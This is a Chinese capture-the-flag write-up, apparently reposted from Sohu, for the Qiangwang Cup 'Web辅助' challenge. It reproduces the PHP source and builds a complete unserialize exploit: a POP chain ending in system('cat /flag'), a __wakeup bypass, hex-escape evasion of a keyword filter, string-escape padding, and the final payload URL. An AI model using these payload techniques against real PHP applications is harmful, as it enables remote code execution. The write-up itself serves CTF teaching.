@@ -1,0 +1,228 @@
+➜浅谈强网杯Web辅助
+http://www.sohu.com/a/415156546_99907709	24687
+<p><strong>1、写在前面</strong></p>
+<p>这里就借由强网杯的一道题目“Web辅助”，来讲讲从构造POP链，字符串逃逸到最后获取flag的过程</p>
+<p><strong>2、题目源码</strong></p>
+<p><strong>index.php</strong></p>
+<p class="ql-align-justify">获取我们传入的username和password，并将其序列化储存</p>
+<p>if (isset($_GET['username']) &amp;&amp; isset($_GET['password'])){</p>
+<p>$username = $_GET['username'];</p>
+<p>$password = $_GET['password'];</p>
+<p>$player = new player($username, $password);</p>
+<p>file_put_contents("caches/".md5($_SERVER['REMOTE_ADDR']), write(serialize($player))); </p>
+<p>echo sprintf('Welcome %s, your ip is %s\n', $username, $_SERVER['REMOTE_ADDR']);</p>
+<p>}</p>
+<p>else{</p>
+<p>echo "Please input the username or password!\n";</p>
+<p>}</p>
+<p><strong>common.php</strong></p>
+<p class="ql-align-justify">这里面的read，write有与'\0\0', chr(0)."".chr(0)相关的替换操作，还有一个check对我们的序列化的内容进行检查，判断是否存在关键字name，这里也是我们需要绕过的一个地方</p>
+<p>&lt;?php</p>
+<p>function read($data){</p>
+<p>$data = str_replace('\0*\0', chr(0)."*".chr(0), $data);</p>
+<p>var_dump($data);</p>            <div class="lookall-box">
+<div class="lookall-shadow"></div>
+<section class="lookall">
+<a href="javascript:;" class="show-all" id="showMore">
+<em>展开全文</em>
+</a>
+</section>
+</div>
+<div class="hidden-content control-hide">
+<p>return $data;</p>
+<p>}</p>
+<p>function write($data){</p>
+<p>$data = str_replace(chr(0)."*".chr(0), '\0*\0', $data);</p>
+<p>return $data;</p>
+<p>}</p>
+<p>function check($data)</p>
+<p>{</p>
+<p>if(stristr($data, 'name')!==False){</p>
+<p>die("Name Pass\n");</p>
+<p>}</p>
+<p>else{</p>
+<p>return $data;</p>
+<p>}</p>
+<p>}</p>
+<p>?&gt;</p>
+<p><strong>play.php</strong></p>
+<p class="ql-align-justify">在写入序列化的内容之后，访问play.php，如果我们的操作通过了check，然后经过了read的替换操作之后，便会进行反序列化操作</p>
+<p>@$player = unserialize(read(check(file_get_contents("caches/".md5($_SERVER['REMOTE_ADDR'])))));</p>
+<p><strong>class.php</strong></p>
+<p class="ql-align-justify">这里存在着各种类，也是我们构造pop链的关键，我们的目的是为了触发最后的cat /flag</p>
+<p>&lt;?php</p>
+<p>class player{</p>
+<p>protected $user;</p>
+<p>protected $pass;</p>
+<p>protected $admin;</p>
+<p>public function __construct($user, $pass, $admin = 0){</p>
+<p>$this-&gt;user = $user;</p>
+<p>$this-&gt;pass = $pass;</p>
+<p>$this-&gt;admin = $admin;</p>
+<p>}</p>
+<p>public function get_admin(){</p>
+<p>$this-&gt;admin = 1;</p>
+<p>return $this-&gt;admin ;</p>
+<p>}</p>
+<p>}</p>
+<p>class topsolo{</p>
+<p>protected $name;</p>
+<p>public function __construct($name = 'Riven'){</p>
+<p>$this-&gt;name = $name;</p>
+<p>}</p>
+<p>public function TP(){</p>
+<p>if (gettype($this-&gt;name) === "function" or gettype($this-&gt;name) === "object"){</p>
+<p>$name = $this-&gt;name;</p>
+<p>$name();</p>
+<p>}</p>
+<p>}</p>
+<p>public function __destruct(){</p>
+<p>$this-&gt;TP();</p>
+<p>}</p>
+<p>}</p>
+<p>class midsolo{</p>
+<p>protected $name;</p>
+<p>public function __construct($name){</p>
+<p>$this-&gt;name = $name;</p>
+<p>}</p>
+<p>public function __wakeup(){</p>
+<p>if ($this-&gt;name !== 'Yasuo'){</p>
+<p>$this-&gt;name = 'Yasuo';</p>
+<p>echo "No Yasuo! No Soul!\n";</p>
+<p>}</p>
+<p>}</p>
+<p>public function __invoke(){</p>
+<p>$this-&gt;Gank();</p>
+<p>}</p>
+<p>public function Gank(){</p>
+<p>if (stristr($this-&gt;name, 'Yasuo')){</p>
+<p>echo "Are you orphan?\n";</p>
+<p>}</p>
+<p>else{</p>
+<p>echo "Must Be Yasuo!\n";</p>
+<p>}</p>
+<p>}</p>
+<p>}</p>
+<p>class jungle{</p>
+<p>protected $name = "";</p>
+<p>public function __construct($name = "Lee Sin"){</p>
+<p>$this-&gt;name = $name;</p>
+<p>}</p>
+<p>public function KS(){</p>
+<p>system("cat /flag");</p>
+<p>}</p>
+<p>public function __toString(){</p>
+<p>$this-&gt;KS(); </p>
+<p>return ""; </p>
+<p>}</p>
+<p>}</p>
+<p>?&gt;</p>
+<p><strong>3、涉及考点</strong></p>
+<ul>
+<li class="ql-align-justify">POP链的构造</li>
+<li class="ql-align-justify">__wakeup的绕过</li>
+<li class="ql-align-justify">关键字“name”检测绕过</li>
+<li class="ql-align-justify">反序列化字符串逃逸</li>
+</ul>
+<p><strong>4、题目出现的魔术方法</strong></p>
+<ul>
+<li class="ql-align-justify">__construct：构造函数，具有构造函数的类会在每次创建新对象时先调用此方法</li>
+<li class="ql-align-justify">__destruct: 析构函数，析构函数会在到某个对象的所有引用都被删除或者当对象被显式销毁时执行</li>
+<li class="ql-align-justify"><strong>wakeup：unserialize()会检查是否存在一个 </strong>wakeup() 方法。如果存在，则会先调用</li>
+<li class="ql-align-justify"><strong>invoke：当尝试以调用函数的方式调用一个对象时</strong>，invoke() 方法会被自动调用</li>
+<li class="ql-align-justify">__toString()：用于一个类被当成字符串时应怎样回应</li>
+</ul>
+<p><strong>5、POP链</strong></p>
+<p>POP链：如果我们需要触发的关键代码在一个类的普通方法中，例如本题的system('cat /flag')在jungle类中的KS方法中，这个时候我们可以通过相同的函数名将类的属性和敏感函数的属性联系起来</p>
+<p><strong>6、POP链的构造</strong></p>
+<p>这里涉及到三个类，topsolo、midsolo、jungle，其中观察到topsolo类中的TP方法中，使用了$name()，如果我们将一个对象赋值给$name，这里便是以调用函数的方式调用了一个对象，此时会触发<strong>invoke方法，而invoke方法存在与midsolo中</strong>，invoke()会触发Gank方法，执行了stristr操作。 </p>
+<p>我们的最终目的是要触发jungle类中的KS方法，从而cat /flag，而触发KS方法得先触发__toString方法，一般来说，在我们使用echo输出对象时便会触发，例如：</p>
+<p>&lt;?php</p>
+<p>class test{</p>
+<p>function __toString(){</p>
+<p>echo "__toString()";</p>
+<p>return "";</p>
+<p>}</p>
+<p>}</p>
+<p>$a = new test();</p>
+<p>echo $a;</p>
+<p>//输出：__toString()</p>
+<p>在common.php中，我们并没有看到有echo一个类的操作，但是有一个stristr($this-&gt;name, 'Yasuo')的操作，我们来看一下：</p>
+<p>&lt;?php</p>
+<p>class test{</p>
+<p>function __toString(){</p>
+<p>echo "__toString()";</p>
+<p>return "";</p>
+<p>}</p>
+<p>}</p>
+<p>$a = new test();</p>
+<p>stristr($a,'name');</p>
+<p>//输出__toString()</p>
+<ul>
+<li>所以整个POP链已经构成了</li>
+</ul>
+<p>topsolo-&gt;__destruct()-&gt;TP()-&gt;$name()-&gt;midsolo-&gt;__invoke()-&gt;Gank()-&gt;stristr()-&gt;jungle-&gt;__toString()-&gt;KS()-&gt;syttem('cat /flag')</p>
+<p>即</p>
+<p>&lt;?php</p>
+<p>class topsolo{</p>
+<p>protected $name;</p>
+<p>public function __construct($name = 'Riven'){</p>
+<p>$this-&gt;name = $name;</p>
+<p>}</p>
+<p>}</p>
+<p>class midsolo{</p>
+<p>protected $name;</p>
+<p>public function __construct($name){</p>
+<p>$this-&gt;name = $name;</p>
+<p>}</p>
+<p>}</p>
+<p>class jungle{</p>
+<p>protected $name = "";</p>
+<p>}</p>
+<p>$a = new topsolo(new midsolo(new jungle()));</p>
+<p>$exp = serialize($a);</p>
+<p>var_dump(urlencode($exp));</p>
+<p>?&gt;</p>
+<p>输出：</p>
+<p>O%3A7%3A%22topsolo%22%3A1%3A%7Bs%3A7%3A%22%00%2A%00name%22%3BO%3A7%3A%22midsolo%22%3A1%3A%7Bs%3A7%3A%22%00%2A%00name%22%3BO%3A6%3A%22jungle%22%3A1%3A%7Bs%3A7%3A%22%00%2A%00name%22%3Bs%3A0%3A%22%22%3B%7D%7D%7D</p>
+<ul>
+<li>在midsolo中<strong>wakeup需要绕过，老套路了，序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过</strong>wakeup的执行，这里我将1改为2</li>
+</ul>
+<p>O%3A7%3A%22topsolo%22%3A1%3A%7Bs%3A7%3A%22%00%2A%00name%22%3BO%3A7%3A%22midsolo%22%3A2%3A%7Bs%3A7%3A%22%00%2A%00name%22%3BO%3A6%3A%22jungle%22%3A1%3A%7Bs%3A7%3A%22%00%2A%00name%22%3Bs%3A0%3A%22%22%3B%7D%7D%7D</p>
+<p>O:7:"topsolo":1:{s:7:"\000*\000name";O:7:"midsolo":2:{s:7:"\000*\000name";O:6:"jungle":1:{s:7:"\000*\000name";s:0:"";}}}</p>
+<p><strong>7、关键字“name”检测绕过</strong></p>
+<p>···</p>
+<p>function check($data)</p>
+<p>{</p>
+<p>if(stristr($data, 'name')!==False){</p>
+<p>die("Name Pass\n");</p>
+<p>}</p>
+<p>else{</p>
+<p>return $data;</p>
+<p>}</p>
+<p>}</p>
+<p>···</p>
+<p class="ql-align-justify">这里使用十六进制绕过\6e\61\6d\65，并将s改为S</p>
+<p>O%3A7%3A%22topsolo%22%3A1%3A%7BS%3A7%3A%22%00%2A%00\6e\61\6d\65%22%3BO%3A7%3A%22midsolo%22%3A2%3A%7BS%3A7%3A%22%00%2A%00\6e\61\6d\65%22%3BO%3A6%3A%22jungle%22%3A1%3A%7BS%3A7%3A%22%00%2A%00\6e\61\6d\65%22%3Bs%3A0%3A%22%22%3B%7D%7D%7D</p>
+<p><strong>8、字符串逃逸</strong></p>
+<p class="ql-align-justify">访问index.php，传入数值，得到序列化内容</p>
+<p>O:6:"player":3:{s:7:"\0*\0user";s:0:"";s:7:"\0*\0pass";s:126:"O:7:"topsolo":1:{S:7:"\0*\0\6e\61\6d\65";O:7:"midsolo":2:{S:7:"\0*\0\6e\61\6d\65";O:6:"jungle":1:{S:7:"\0*\0\6e\61\6d\65";s:0:"";}}}";s:8:"\0*\0admin";i:0;}</p>
+<p class="ql-align-justify">可以看到对象topsolo，midsolo被s:102，所包裹，我们要做的就是题目环境本身的替换字符操作从而达到对象topsolo，midsolo从引号的包裹中逃逸出来</p>
+<p>···</p>
+<p>function read($data){</p>
+<p>$data = str_replace('\0*\0', chr(0)."*".chr(0), $data);</p>
+<p>var_dump($data);</p>
+<p>return $data;</p>
+<p>}</p>
+<p>function write($data){</p>
+<p>$data = str_replace(chr(0)."*".chr(0), '\0*\0', $data);</p>
+<p>return $data;</p>
+<p>}</p>
+<p>···</p>
+<p class="ql-align-justify">在反序列化操作前，有个read的替换操作，字符数量从5位变成3位，合理构造username的长度，经过了read的替换操作后，最后将";s:7:"\0\0pass";s:126吃掉，需要吃掉的长度为23，因为5-&gt;3，所以得为2的倍数，需要在password中再填充一个字符C，变成24位，所以我们一共需要构造12个\0\0来进行username填充，得到username</p>
+<p>username=\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0</p>
+<p class="ql-align-justify">在password中补上被吃掉的pass部分，构造password的提交内容</p>
+<p>password=C";s:7:"\0*\0pass";O%3A7%3A%22topsolo%22%3A1%3A%7BS%3A7%3A%22%00%2A%00\6e\61\6d\65%22%3BO%3A7%3A%22midsolo%22%3A2%3A%7BS%3A7%3A%22%00%2A%00\6e\61\6d\65%22%3BO%3A6%3A%22jungle%22%3A1%3A%7BS%3A7%3A%22%00%2A%00\6e\61\6d\65%22%3Bs%3A0%3A%22%22%3B%7D%7D%7D</p>
+<p class="ql-align-justify">最后提交</p>
+<p>?username=\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0&amp;password=C";s:7:"\0*\0pass";O%3A7%3A%22topsolo%22%3A1%3A%7BS%3A7%3A%22%00%2A%00\6e\61\6d\65%22%3BO%3A7%3A%22midsolo%22%3A2%3A%7BS%3A7%3A%22%00%2A%00\6e\61\6d\65%22%3BO%3A6%3A%22jungle%22%3A1%3A%7BS%3A7%3A%22%00%2A%00\6e\61\6d\65%22%3Bs%3A0%3A%22%22%3B%7D%7D%7D</p>
+<p class="ql-align-justify">然后访问play.php即可得到flag</p>
